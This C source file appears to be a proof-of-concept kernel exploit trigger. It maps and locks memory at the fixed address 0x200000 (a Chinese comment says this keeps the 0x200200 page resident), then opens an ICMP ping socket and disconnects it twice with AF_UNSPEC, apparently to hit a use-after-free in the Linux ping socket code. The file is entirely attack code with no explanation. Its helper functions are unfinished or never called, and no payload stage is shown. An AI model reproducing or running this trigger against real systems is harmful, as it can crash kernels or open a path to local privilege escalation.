#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <linux/in.h>
#include <linux/mman.h>
#include <sys/mman.h>


#define false 0
#define true 1
#define BASE_ADDR 0x200000
#define BASE_LEN 0x1000
static int no_crash() {
	void * map = mmap((void *)BASE_ADDR,BASE_LEN, PROT_READ|PROT_WRITE,
		MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED,-1,0);
	if (map != (void *)BASE_ADDR) {
		printf("[-]0x200200 can't map\n");
		return false;
	}
	mlock(map, BASE_LEN);
	*(void **)map = NULL;
	printf("%x\n", *(void**)map);  //防止0x200200所在page被置换到swap区
	return true;
}

static int get_stamp(){
	return true;
}

int main(int argc, char const *argv[])
{
	struct sockaddr sa;
	int fd, ret;
	fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
	if (fd == -1) {
		printf("socket create failed\n");
	}
	memset(&sa,0,sizeof(sa));
	sa.sa_family = AF_INET;
	ret = connect(fd,&sa,sizeof(sa));
	memset(&sa,0,sizeof(sa));
	sa.sa_family = AF_UNSPEC;
	ret = connect(fd,&sa,sizeof(sa)); 
	ret = connect(fd,&sa,sizeof(sa));
	return 0;
}